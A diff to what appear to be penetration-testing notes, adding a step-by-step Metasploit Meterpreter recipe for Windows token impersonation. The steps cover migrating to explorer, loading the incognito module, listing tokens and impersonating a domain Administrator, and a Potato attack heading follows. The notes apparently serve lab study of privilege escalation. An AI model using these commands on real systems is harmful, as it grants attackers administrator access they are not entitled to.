@@ -12,3 +12,15 @@ Privileges required for successful impersonation attack
 ### Metasploit
 **Incognito** - built in meterpreter module that allows you to impersonate after successful exploitation
 
+_After meterpreter session is established_  
+1. look for process ID for explorer - ```pgrep explorer```
+2. migrate to that process -- ```migrate (process number)```. If failed, you may need token impersonation.
+3. ```getprivs``` - this will allow you to see if any of the assigned privileges above are available
+4. ```load incognito``` - this loads the module
+5. ```list_tokens -u``` -- this will list tokens available for use
+6. Copy the name of the person you would like to impersonate.
+   - Full string example: ATTACKDEFENSE\Administrator
+7. ```impersonate_token "ATTACKDEFENSE\Administrator"```
+
+**Potato attack**  
+This attack with generate an NT authority access token  
